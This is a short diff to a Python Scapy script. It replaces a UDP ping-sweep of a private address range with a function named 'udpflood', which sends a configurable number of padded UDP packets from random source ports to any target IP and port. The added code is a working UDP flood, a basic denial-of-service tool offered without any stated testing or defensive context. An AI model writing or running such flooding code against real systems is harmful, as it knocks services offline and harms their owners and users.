@@ -1,6 +1,9 @@
 from scapy.all import *
 
 
-
-ans, unans = sr( IP(dst="192.168.*.1-10")/UDP(dport=0) )
-ans.summary( lambda s,r : r.sprintf("%IP.src% is alive") )
+def udpflood(targetip, targetport, number, size):
+    ip = IP(dst=targetip)
+    udp = UDP(dport=targetport, sport=RandShort())
+    data = Raw(b"X" * size)
+    packet = ip / udp / data
+    send(packet , count=number, verbose=0)
